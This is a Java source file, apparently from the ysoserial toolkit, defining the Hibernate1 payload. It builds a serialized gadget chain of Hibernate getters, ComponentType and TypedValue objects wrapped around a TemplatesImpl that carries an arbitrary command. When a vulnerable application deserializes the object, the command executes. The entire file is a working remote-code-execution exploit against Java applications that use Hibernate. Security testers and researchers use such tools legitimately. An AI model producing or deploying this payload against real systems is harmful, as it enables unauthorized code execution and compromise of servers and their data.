package ysoserial.payloads;


import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

import org.hibernate.engine.spi.TypedValue;
import org.hibernate.tuple.component.AbstractComponentTuplizer;
import org.hibernate.tuple.component.PojoComponentTuplizer;
import org.hibernate.type.AbstractType;
import org.hibernate.type.ComponentType;
import org.hibernate.type.Type;

import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;


/**
 * 
 * org.hibernate.property.access.spi.GetterMethodImpl.get()
 * org.hibernate.tuple.component.AbstractComponentTuplizer.getPropertyValue()
 * org.hibernate.type.ComponentType.getPropertyValue(C)
 * org.hibernate.type.ComponentType.getHashCode()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.engine.spi.TypedValue$1.initialize()
 * org.hibernate.internal.util.ValueHolder.getValue()
 * org.hibernate.engine.spi.TypedValue.hashCode()
 * 
 * 
 * Requires:
 * - Hibernate (>= 5 gives arbitrary method invocation, <5 getXYZ only)
 * 
 * @author mbechler
 */
public class Hibernate1 implements ObjectPayload<Object>, DynamicDependencies {

    public static String[] getDependencies () {
        if ( System.getProperty("hibernate5") != null ) {
            return new String[] {
                "org.hibernate:hibernate-core:5.0.7.Final", "aopalliance:aopalliance:1.0", "org.jboss.logging:jboss-logging:3.3.0.Final",
                "javax.transaction:javax.transaction-api:1.2"
            };
        }

        return new String[] {
            "org.hibernate:hibernate-core:4.3.11.Final", "aopalliance:aopalliance:1.0", "org.jboss.logging:jboss-logging:3.3.0.Final",
            "javax.transaction:javax.transaction-api:1.2", "dom4j:dom4j:1.6.1"
        };

    }


    public static Object makeGetter ( Class<?> tplClass, String method ) throws NoSuchMethodException, SecurityException, InstantiationException,
            IllegalAccessException, IllegalArgumentException, InvocationTargetException, ClassNotFoundException {
        if ( System.getProperty("hibernate5") != null ) {
            return makeHibernate5Getter(tplClass, method);
        }
        return makeHibernate4Getter(tplClass, method);
    }


    public static Object makeHibernate4Getter ( Class<?> tplClass, String method ) throws ClassNotFoundException, NoSuchMethodException,
            SecurityException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        Class<?> getterIf = Class.forName("org.hibernate.property.Getter");
        Class<?> basicGetter = Class.forName("org.hibernate.property.BasicPropertyAccessor$BasicGetter");
        Constructor<?> bgCon = basicGetter.getDeclaredConstructor(Class.class, Method.class, String.class);
        bgCon.setAccessible(true);

        if ( !method.startsWith("get") ) {
            throw new IllegalArgumentException("Hibernate4 can only call getters");
        }

        String propName = Character.toLowerCase(method.charAt(3)) + method.substring(4);

        Object g = bgCon.newInstance(tplClass, tplClass.getDeclaredMethod(method), propName);
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }


    public static Object makeHibernate5Getter ( Class<?> tplClass, String method ) throws NoSuchMethodException, SecurityException,
            ClassNotFoundException, InstantiationException, IllegalAccessException, IllegalArgumentException, InvocationTargetException {
        Class<?> getterIf = Class.forName("org.hibernate.property.access.spi.Getter");
        Class<?> basicGetter = Class.forName("org.hibernate.property.access.spi.GetterMethodImpl");
        Constructor<?> bgCon = basicGetter.getConstructor(Class.class, String.class, Method.class);
        Object g = bgCon.newInstance(tplClass, "test", tplClass.getDeclaredMethod(method));
        Object arr = Array.newInstance(getterIf, 1);
        Array.set(arr, 0, g);
        return arr;
    }


    public Object getObject ( String[] command ) throws Exception {
        Object tpl = Gadgets.createTemplatesImpl(command);
        Object getters = makeGetter(tpl.getClass(), "getOutputProperties");
        return makeCaller(tpl, getters);
    }


    static Object makeCaller ( Object tpl, Object getters ) throws NoSuchMethodException, InstantiationException, IllegalAccessException,
            InvocationTargetException, NoSuchFieldException, Exception, ClassNotFoundException {
        PojoComponentTuplizer tup = Reflections.createWithoutConstructor(PojoComponentTuplizer.class);
        Reflections.getField(AbstractComponentTuplizer.class, "getters").set(tup, getters);

        ComponentType t = Reflections.createWithConstructor(ComponentType.class, AbstractType.class, new Class[0], new Object[0]);
        Reflections.setFieldValue(t, "componentTuplizer", tup);
        Reflections.setFieldValue(t, "propertySpan", 1);
        Reflections.setFieldValue(t, "propertyTypes", new Type[] {
            t
        });

        TypedValue v1 = new TypedValue(t, null);
        Reflections.setFieldValue(v1, "value", tpl);
        Reflections.setFieldValue(v1, "type", t);

        TypedValue v2 = new TypedValue(t, null);
        Reflections.setFieldValue(v2, "value", tpl);
        Reflections.setFieldValue(v2, "type", t);

        return Gadgets.makeMap(v1, v2);
    }


    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(Hibernate1.class, args);
    }
}
